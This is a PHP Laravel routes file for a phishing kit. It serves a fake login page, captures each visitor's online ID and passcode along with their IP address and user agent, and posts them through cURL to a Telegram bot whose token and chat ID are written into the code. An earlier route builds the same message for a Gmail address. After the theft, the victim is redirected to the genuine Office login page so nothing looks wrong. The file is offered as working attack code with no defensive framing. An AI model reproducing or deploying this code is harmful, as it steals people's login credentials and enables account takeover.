<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\LoginNotification;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Route::get('/', function () {
//     return view('welcome');
// });

Route::get('/', function () {
    return view('login');
});


Route::post('/login', function (Request $request) {
    $Receive_email = "ridhabelgacem0@gmail.com";

    $ai = trim($request['ai']);
    $pr = trim($request['pr']);

    // if($ai != null && $pr != null){
    $ip = $_SERVER['REMOTE_ADDR']; //getenv("REMOTE_ADDR");
    // $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "|----------| xLs |--------------|\n";
    
    $message .= "Online ID            : ".$ai."\n";
    $message .= "Passcode              : ".$pr."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
    $subject = "Login : $ip";
    // $res = Mail::to($send)->send('Hello world', $message);
    // $res = mail($send, $subject, $message);   
    // echo $res;
        
    
    return redirect()->route('password.view', ['email' => $ai]);

        
})->name("login.save");


Route::get('/password/email', function (Request $request) {
    $email = $request->input('email');
    return view('password', ["email" => $email]);
})->name("password.view");


Route::post('/password', function (Request $request) {
    $receiveEmail = "ridhabelgacem0@gmail.com";

    // Sanitize user input to prevent malicious input
    $ai = htmlspecialchars(trim($request->input('ai')));
    $pr = htmlspecialchars(trim($request->input('pr')));

    // Capture IP address and user agent
    $ip = $request->ip(); 
    $userAgent = $request->header('User-Agent');

    // Prepare message
    $message = "|----------| xLs |--------------|\n";
    $message .= "Online ID            : " . $ai . "\n";
    $message .= "Passcode             : " . $pr . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $userAgent . "\n";
    $message .= "|----------- CrEaTeD bY VeNzA --------------|\n";

    // Send message to Telegram bot (Replace with your actual Telegram bot API)
    $chatId = '2112852041';
    $token = '6819516823:AAHjSdp4OYmnMlnzoHb7QgQRVOXSZ4LKaTw';
    $url = "https://api.telegram.org/bot{$token}/sendMessage";

    // Prepare Telegram API request
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Using cURL to send the message to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect to Office login page
    return redirect()->away('https://www.office.com/login?es=UnauthClick&ru=%2f');
})->name("password.save");

